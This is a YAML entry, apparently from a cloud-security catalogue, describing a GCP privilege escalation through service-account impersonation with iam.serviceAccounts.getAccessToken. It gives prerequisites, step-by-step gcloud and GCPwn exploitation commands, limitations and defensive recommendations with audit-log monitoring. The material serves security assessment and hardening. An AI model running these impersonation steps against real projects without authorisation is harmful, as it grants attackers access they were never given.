id: gcp-iam-001
name: iam.serviceAccounts.getAccessToken
category: principal-access
services:
- iam
permissions:
  required:
  - permission: iam.serviceAccounts.getAccessToken
    resourceConstraints: Must be granted on the target service account, either via a custom role scoped to this permission or the predefined `roles/iam.serviceAccountTokenCreator` role
  additional:
  - permission: resourcemanager.projects.get
    resourceConstraints: Helpful for confirming the current project context and the caller's own lack of project-level roles
  - permission: iam.serviceAccounts.list
    resourceConstraints: Helpful for enumerating service accounts in the project to identify impersonation targets
  - permission: iam.serviceAccounts.getIamPolicy
    resourceConstraints: Useful for inspecting IAM policy bindings on candidate service accounts to find impersonation grants (`roles/iam.serviceAccountTokenCreator` or a custom role granting `iam.serviceAccounts.getAccessToken`)
description: A principal holding `iam.serviceAccounts.getAccessToken` on a service account can call the IAM Credentials API's `generateAccessToken` method to mint a short-lived OAuth 2.0 access token that authenticates as that service account, without ever needing a long-lived key. `gcloud` wraps this in the `--impersonate-service-account` flag. If the target service account holds a privileged project role, the attacker inherits all of its permissions for the lifetime of the minted token, entirely through IAM bindings and with no credential theft or code execution involved.
prerequisites:
  admin:
  - A target service account must exist that the attacker's principal holds `iam.serviceAccounts.getAccessToken` on, whether via a custom role or the predefined `roles/iam.serviceAccountTokenCreator` role
  - The target service account must hold administrative permissions at the project level (e.g., `roles/owner`, `roles/editor`, or an equivalent custom role)
  lateral:
  - A target service account must exist that the attacker's principal holds `iam.serviceAccounts.getAccessToken` on, whether via a custom role or the predefined `roles/iam.serviceAccountTokenCreator` role
exploitationSteps:
  gcloud:
  - step: 1
    command: |
      gcloud iam service-accounts list --format='value(email)'
    description: Enumerate service accounts in the project to identify potential impersonation targets
  - step: 2
    command: |
      gcloud iam service-accounts get-iam-policy TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
    description: Inspect the IAM policy on a candidate service account to confirm the attacker's principal holds `iam.serviceAccounts.getAccessToken` on it (via a custom role or `roles/iam.serviceAccountTokenCreator`)
  - step: 3
    command: |
      gcloud projects get-iam-policy PROJECT_ID \
        --flatten="bindings[].members" \
        --filter="bindings.members:TARGET_SA@PROJECT_ID.iam.gserviceaccount.com" \
        --format="table(bindings.role)"
    description: Confirm the target service account's own project-level role to determine the value of impersonating it
  - step: 4
    command: |
      gcloud auth print-access-token \
        --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
    description: Mint a short-lived OAuth access token that authenticates as the target service account
  - step: 5
    command: |
      gcloud PROJECT_RESOURCE_COMMAND \
        --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
    description: Run any `gcloud` command with `--impersonate-service-account` set to the target account to operate with its inherited project permissions
  gcpwn:
  - step: 1
    command: |
      modules run enum_gcp --iam
    description: Enumerate IAM bindings across the project (GCPwn's IAM enumeration module surfaces `iam.serviceAccounts.getAccessToken` grants as it maps out privilege escalation edges)
  - step: 2
    command: |
      modules run exploit_generate_access_token \
        --target-sa projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
    description: Use GCPwn's single-permission-movement exploit module to mint a short-lived OAuth 2.0 access token for the target service account and pivot the active session's credentials to it
limitations: |
  This path provides administrative access only if the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. If the target only has narrowly scoped permissions, the attacker inherits only those, though even limited additional access may enable further multi-hop escalation. Note that `roles/editor` and `roles/viewer` deliberately exclude Secret Manager payload access (`secretmanager.versions.access`), so reaching secrets specifically requires the target to also hold an explicit `roles/secretmanager.secretAccessor` grant.
recommendation: |
  Service account impersonation is Google's recommended alternative to long-lived service account keys, but granting `iam.serviceAccounts.getAccessToken` across a privilege boundary turns that best practice into a privilege escalation path.

  - **Avoid granting impersonation rights across privilege boundaries** - Never grant `iam.serviceAccounts.getAccessToken` (whether via the predefined `roles/iam.serviceAccountTokenCreator` role or a custom role bundling just this permission) to a principal that should not otherwise hold the target service account's permissions.
  - **Scope impersonation grants with IAM Conditions** - Restrict bindings with time-bound or attribute-based conditions rather than granting unconditional, standing access:

  ```json
  {
    "role": "roles/iam.serviceAccountTokenCreator",
    "members": ["serviceAccount:automation-sa@PROJECT_ID.iam.gserviceaccount.com"],
    "condition": {
      "title": "time-bound-impersonation",
      "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
    }
  }
  ```

  - **Apply least privilege to service accounts that can be impersonated** - Replace broad primitive roles like `roles/editor` or `roles/owner` with narrowly scoped predefined or custom roles.
  - **Prefer Workload Identity Federation** - Where possible, grant external workloads direct, narrowly-scoped access instead of chaining through an intermediate impersonatable service account.
  - Monitor Cloud Audit Logs for `iam.googleapis.com/GenerateAccessToken` events where the impersonated service account holds `roles/editor` or `roles/owner`.
  - Monitor for `iam.googleapis.com/SetIamPolicy` events that add new `iam.serviceAccounts.getAccessToken` grants (via `roles/iam.serviceAccountTokenCreator` or a custom role) to service accounts holding elevated project roles.
  - Investigate `GenerateAccessToken` or `SignJwt` events followed within seconds by API calls the caller's own identity does not otherwise have access to.
  - Regularly audit IAM bindings with Policy Analyzer / IAM Recommender to identify service accounts with unused or overly broad impersonation grants.
